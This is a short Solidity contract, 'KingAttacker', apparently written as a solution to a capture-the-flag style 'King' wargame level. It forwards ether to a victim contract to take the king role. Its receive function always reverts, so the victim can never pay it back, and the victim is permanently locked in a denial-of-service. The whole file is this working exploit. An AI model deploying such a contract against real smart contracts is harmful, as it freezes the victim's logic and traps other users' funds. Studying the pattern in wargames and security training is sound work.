// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker{
    address public victimContractAddress;
    bool public flag = false;
    constructor(address _victimContractAddress){
        victimContractAddress = _victimContractAddress;
    }
    function getContractBalance(address _address) public view returns(uint256){
        return _address.balance;
    }

    function attack()public payable {
        (bool success,) = payable (victimContractAddress).call{value:msg.value}("");
        require(success,"transfer failed");
        flag = true;
    }
     
    receive() external payable {
            revert("Locked the contract");        
     }
    
    function fund() external  payable {} // 用来后期打钱
}